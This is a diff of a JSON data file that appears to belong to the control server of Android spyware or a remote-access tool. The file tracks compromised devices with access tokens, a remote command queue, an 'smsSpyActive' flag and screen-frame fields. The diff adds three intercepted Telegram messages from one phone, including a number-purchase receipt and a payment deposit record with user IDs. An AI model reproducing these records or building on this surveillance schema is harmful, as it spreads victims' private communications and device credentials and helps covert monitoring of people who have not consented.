@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777350596354,
+    "lastSeen": 1777350598098,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -4491,16 +4491,8 @@
     "deviceName": "HP-KONTOL-A754",
     "ownerUsername": "Ubill_raa",
     "token": "bfb9af2cf50b25656e3283905dce6368",
-    "lastSeen": 1777350594341,
-    "commandQueue": [
-      {
-        "type": "flashlight",
-        "payload": {
-          "state": "off"
-        },
-        "sentAt": 1777350597005
-      }
-    ],
+    "lastSeen": 1777350597447,
+    "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-28T04:01:30.004Z",
     "deviceInfo": {
@@ -4515,6 +4507,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
+        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: TikTok/Douyin\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******21\n• Waktu: 28/04/2026, 11.24",
+        "time": "28/04 11:29",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777350599297
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗚𝗕 𝗖𝗣𝗔𝗡𝗘𝗟 𝗔𝗟𝗟 𝗥𝗢𝗟𝗘 𝗕𝗬 DAFF: Barker tag bot 7",
+        "content": "info 1k sini yg mau admin perma😭 buat passin dana\n\n🏪 👊🏿 👰🏼‍♀️​\n\nPanggilan berakhir.\n@zazyvala_id",
+        "time": "28/04 11:29",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777350598160
+      },
+      {
+        "appName": "Telegram",
+        "sender": "— Qwērty • 初心者 𖹬",
+        "content": "⪼━━━〔 💰 𝐃𝐄𝐏𝐎𝐒𝐈𝐓 𝐒𝐔𝐊𝐒𝐄𝐒 〕━━━⪻\n│\n│ ⟡ Nama       : 𝔞𝔯𝔪𝔞\n│ ⟡ ID         : 8608149994\n│ ⟡ ID Deposit : DEP1777350525517\n│ ⟡ Nominal    : Rp5.000\n│ ⟡ Total Saldo: Rp6.400\n│ ⟡ Metode     : QRIS\n│ ⟡ Status     : ✅ SUKSES\n│\n╰──────────────────────────\n🕐 28/4/2026, 11.29.51\n\n#DepositSukses",
+        "time": "28/04 11:29",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777350597869
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
